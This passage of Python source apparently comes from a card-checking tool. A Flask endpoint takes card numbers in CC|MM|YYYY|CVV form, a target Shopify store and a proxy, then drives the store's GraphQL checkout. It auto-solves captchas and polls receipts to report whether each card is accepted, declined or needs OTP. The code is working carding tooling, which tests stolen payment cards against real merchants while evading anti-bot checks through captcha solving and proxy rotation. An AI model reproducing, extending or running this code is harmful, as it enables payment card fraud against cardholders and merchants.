                            "lastName": lastName, "zoneCode": state, "phone": phone,
                        }},
                    },
                    "buyerIdentity": {
                        "customer": {"presentmentCurrency": currency, "countryCode": country_code},
                        "email": email, "emailChanged": False,
                        "phoneCountryCode": country_code,
                        "marketingConsent": [{"email": {"value": email}}],
                        "shopPayOptInPhone": {"number": phone, "countryCode": country_code},
                        "rememberMe": False,
                    },
                    "taxes": {
                        "proposedAllocations": None,
                        "proposedTotalAmount": {"value": {"amount": str(tax_amount), "currencyCode": currency}},
                        "proposedTotalIncludedAmount": None,
                        "proposedMixedStateTotalAmount": None,
                        "proposedExemptions": [],
                    },
                    "tip": {"tipLines": []},
                    "note": {"message": None, "customAttributes": []},
                    "localizationExtension": {"fields": []},
                    "nonNegotiableTerms": None,
                    "optionalDuties": {"buyerRefusesDuties": False},
                },
                "attemptToken": attempt_token,
                "metafields": [],
                "analytics": {"requestUrl": checkout_url},
            }
            if checkpoint_data:
                submit_variables["input"]["checkpointData"] = checkpoint_data

            submit_json = {
                "query": MUTATION_SUBMIT,
                "variables": submit_variables,
                "operationName": "SubmitForCompletion",
            }
            response, text = await make_graphql_request(
                session, graphql_url, params, headers, submit_json, proxy
            )

            # ── captcha gate #3 (the common one) ─────────────────────
            if is_captcha_required(text):
                log.info("CAPTCHA_REQUIRED on submit — solving")
                token = await solve_captcha_async(checkout_url, proxy_str)
                if not token:
                    return False, "CAPTCHA_REQUIRED on submit (solve failed)", gateway, total_price, currency, False
                captcha_solved = True
                submit_variables["input"]["checkpointData"] = token
                submit_json = {
                    "query": MUTATION_SUBMIT,
                    "variables": submit_variables,
                    "operationName": "SubmitForCompletion",
                }
                response, text = await make_graphql_request(
                    session, graphql_url, params, headers, submit_json, proxy
                )
                if is_captcha_required(text):
                    return False, "CAPTCHA_REQUIRED on submit (retry still blocked)", gateway, total_price, currency, captcha_solved

            if "Your order total has changed." in text:
                return False, "Site not supported", gateway, total_price, currency, captcha_solved
            if "The requested payment method is not available." in text:
                return False, "Payment method not available", gateway, total_price, currency, captcha_solved

            try:
                resp_json = json.loads(text)
                submit_data = resp_json.get("data", {}).get("submitForCompletion", {})
                if not submit_data:
                    for err in resp_json.get("errors", []):
                        code = err.get("code")
                        if code:
                            return False, code, gateway, total_price, currency, captcha_solved
                    return False, "Empty submit response", gateway, total_price, currency, captcha_solved

                result_type = submit_data.get("__typename", "")
                rid = None
                if result_type in ("SubmitSuccess", "SubmittedForCompletion", "SubmitAlreadyAccepted"):
                    receipt = submit_data.get("receipt", {})
                    if not receipt:
                        return False, "SubmitSuccess but no receipt", gateway, total_price, currency, captcha_solved
                    if receipt.get("__typename", "") == "ProcessedReceipt":
                        return True, "ORDER_PLACED", gateway, total_price, currency, captcha_solved
                    rid = receipt.get("id")
                    if not rid:
                        return False, "No receipt ID", gateway, total_price, currency, captcha_solved
                elif result_type == "SubmitFailed":
                    return False, extract_clean_response(submit_data.get("reason", "Unknown")), gateway, total_price, currency, captcha_solved
                elif result_type == "SubmitRejected":
                    for err in submit_data.get("errors", []):
                        code = err.get("code", "")
                        detail = err.get("localizedMessage") or err.get("nonLocalizedMessage")
                        if code in ("GENERIC_ERROR", "PAYMENT_FAILED", "") and detail:
                            return False, detail, gateway, total_price, currency, captcha_solved
                        if code:
                            return False, code, gateway, total_price, currency, captcha_solved
                    return False, "Submit Rejected", gateway, total_price, currency, captcha_solved
                elif result_type == "Throttled":
                    return False, "Throttled", gateway, total_price, currency, captcha_solved
                else:
                    receipt = submit_data.get("receipt", {})
                    rid = receipt.get("id")
                    if not rid:
                        return False, "No receipt ID", gateway, total_price, currency, captcha_solved
            except json.JSONDecodeError:
                return False, f"Invalid JSON in submit: {text[:100]}", gateway, total_price, currency, captcha_solved
            except Exception as e:
                return False, f"Error parsing submit: {e}", gateway, total_price, currency, captcha_solved

            # ── Poll for receipt ─────────────────────────────────────
            params = {"operationName": "PollForReceipt"}
            poll_json = {
                "query": QUERY_POLL,
                "variables": {"receiptId": rid, "sessionToken": sst},
                "operationName": "PollForReceipt",
            }
            await asyncio.sleep(2)

            final_text = ""
            for _ in range(5):
                response, final_text = await make_graphql_request(
                    session, graphql_url, params, headers, poll_json, proxy
                )

                if is_captcha_required(final_text):
                    log.info("CAPTCHA_REQUIRED on poll — solving")
                    token = await solve_captcha_async(checkout_url, proxy_str)
                    if token:
                        captcha_solved = True
                        poll_json["variables"]["checkpointData"] = token
                    continue

                try:
                    poll_resp = json.loads(final_text)
                    receipt_data = poll_resp.get("data", {}).get("receipt", {})
                    if receipt_data:
                        typename = receipt_data.get("__typename", "")
                        if typename == "ProcessedReceipt":
                            return True, "ORDER_PLACED", gateway, total_price, currency, captcha_solved
                        if typename == "FailedReceipt":
                            err = receipt_data.get("processingError", {})
                            etype = err.get("__typename", "")
                            if etype == "PaymentFailed":
                                code = err.get("code", "")
                                msg = err.get("messageUntranslated", "")
                                if code in ("GENERIC_ERROR", "PAYMENT_FAILED", "") and msg:
                                    return True, msg, gateway, total_price, currency, captcha_solved
                                return True, code or "PAYMENT_FAILED", gateway, total_price, currency, captcha_solved
                            return True, err.get("code") or etype or "UNKNOWN_ERROR", gateway, total_price, currency, captcha_solved
                        if typename == "ActionRequiredReceipt":
                            return True, "OTP_REQUIRED", gateway, total_price, currency, captcha_solved
                        if typename in ("ProcessingReceipt", "WaitingReceipt"):
                            await asyncio.sleep(3)
                            continue
                except Exception:
                    pass

                if "WaitingReceipt" in final_text:
                    await asyncio.sleep(3)
                else:
                    break

            if "WaitingReceipt" in final_text:
                return False, "Change Proxy or Site", gateway, total_price, currency, captcha_solved

            try:
                res_json = json.loads(final_text)
                result = (res_json.get("data", {})
                                 .get("receipt", {})
                                 .get("processingError", {})
                                 .get("code"))
                if "shopify_payments" in str(res_json):
                    return True, "ORDER_PLACED", gateway, total_price, currency, captcha_solved
                if result:
                    return True, result, gateway, total_price, currency, captcha_solved
                return True, "MISMATCHED_BILL", gateway, total_price, currency, captcha_solved
            except Exception:
                pass

            code = extract_between(final_text, '{"code":"', '"')
            fl = final_text.lower()
            if "actionreq" in fl or "action_required" in fl:
                return True, "OTP_REQUIRED", gateway, total_price, currency, captcha_solved
            if "processedreceipt" in fl:
                return True, "ORDER_PLACED", gateway, total_price, currency, captcha_solved
            if "failedreceipt" in fl or "declined" in fl:
                return True, code or "CARD_DECLINED", gateway, total_price, currency, captcha_solved
            return False, "Unknown Result", gateway, total_price, currency, captcha_solved

    except Exception as e:
        log.error("process_card error: %s", e)
        log.debug(traceback.format_exc())
        return False, f"Error Processing Card: {e}", gateway, total_price, currency, captcha_solved


def parse_cc_string(cc_string):
    parts = cc_string.split("|")
    if len(parts) != 4:
        raise ValueError("Invalid CC format. Use: CC|MM|YYYY|CVV")
    return {
        "cc": parts[0].strip(),
        "mes": parts[1].strip(),
        "ano": parts[2].strip(),
        "cvv": parts[3].strip(),
    }


async def process_card_async(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None):
    return await process_card(cc, mes, ano, cvv, site_url, variant_id, proxy_str)


# ═══════════════════════════════════════════════════════════════════
# Flask API
# ═══════════════════════════════════════════════════════════════════

app = Flask(__name__)


@app.route("/shopify", methods=["GET"])
def shopify_checker():
    try:
        site = request.args.get("site")
        cc_string = request.args.get("cc")
        proxy_str = request.args.get("proxy")

        if not site:
            return jsonify({"error": "Missing 'site' parameter", "status": False}), 400
        if not cc_string:
            return jsonify({"error": "Missing 'cc' parameter CC|MM|YYYY|CVV", "status": False}), 400

        try:
            p = parse_cc_string(cc_string)
        except ValueError as e:
            return jsonify({"error": str(e), "status": False}), 400

        variant_id = request.args.get("variant")

        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            success, message, gateway, price, currency, solved = loop.run_until_complete(
                process_card_async(p["cc"], p["mes"], p["ano"], p["cvv"],
                                   site, variant_id, proxy_str)
            )
        finally:
            loop.close()

        return jsonify({
            "Gateway": gateway,
            "Price": float(price) if str(price).replace(".", "", 1).isdigit() else 0.0,
            "Response": extract_clean_response(message),
            "Status": success,
            "cc": cc_string,
            "CaptchaSolved": solved,
        })
    except Exception as e:
        return jsonify({
            "error": str(e),
            "status": False,
            "Gateway": "UNKNOWN",
            "Price": 0.0,
            "Response": f"ERROR: {e}",
            "cc": request.args.get("cc", ""),
            "CaptchaSolved": False,
        }), 500


@app.route("/captcha/status", methods=["GET"])
def captcha_status():
    return jsonify({
        "solver_available": _SOLVER_AVAILABLE,
        "solver_import_error": _SOLVER_IMPORT_ERR,
        "captcha_enabled": CAPTCHA_ENABLED,
        "nocaptcha_key_set": bool(NOCAPTCHA_API_KEY),
        "chrome_binary": CHROME_BINARY or "auto",
        "chromedriver_path": CHROMEDRIVER_PATH or "auto",
    })


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    log.info("shopify-captcha API on :%d  |  solver=%s  |  captcha=%s",
             port, _SOLVER_AVAILABLE, CAPTCHA_ENABLED)
    if not _SOLVER_AVAILABLE:
        log.warning("captcha solver not importable: %s", _SOLVER_IMPORT_ERR)
    if not CAPTCHA_ENABLED:
        log.warning("NOCAPTCHA_API_KEY not set — CAPTCHA_REQUIRED will not be auto-solved")
    app.run(host="0.0.0.0", port=port, debug=False, threaded=True)
